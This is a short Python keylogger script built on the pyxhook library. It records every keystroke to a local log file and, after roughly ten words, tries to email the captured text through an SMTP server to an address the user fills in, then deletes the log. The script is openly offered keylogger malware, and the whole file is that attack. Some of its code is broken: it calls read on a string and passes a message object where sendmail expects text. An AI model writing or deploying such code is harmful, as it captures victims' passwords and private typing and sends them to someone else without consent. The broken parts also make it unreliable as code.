#!/usr/bin/env python
import os
import pyxhook
import smtplib
from email.mime.text import MIMEText

# location of the log file
log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('file.log')
)

# Allow setting the cancel key (ctrl + c sometimes doesn't work)
cancel_key = ord(
    os.environ.get(
        'cancel',
        '=' #your key here
    )[0]
)

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        # File does not exist, or no permissions.
        pass


def OnKeyPress(event):
    with open(log_file, 'a') as f:
        if event.Key == 'space': 
            f.write(' ')
        elif event.Key == 'Return':
            f.write('\n')
        elif event.Key == 'BackSpace':
            f.write('\n{}\n'.format(event.Key))
        else:
            f.write('{}'.format(event.Key))
    if event.Ascii == cancel_key:
        new_hook.cancel()
    log = open('file.log', 'r').read()
    count = len(log.split())
    if count >= 10:
    #try to send the mail every 10 words typed
        From = 'whatever@NOT_GMAIL.com' 
        To = 'your mail'
        msg = MIMEText(log.read())
        #if sending to gmail, check your spam box
        s = smtplib.SMTP('localhost')
        #or use your own smtp server
        try:
            s.sendmail(From, To, msg)
            s.quit()
            os.remove('file.log')
            pass
        except:
            pass


new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
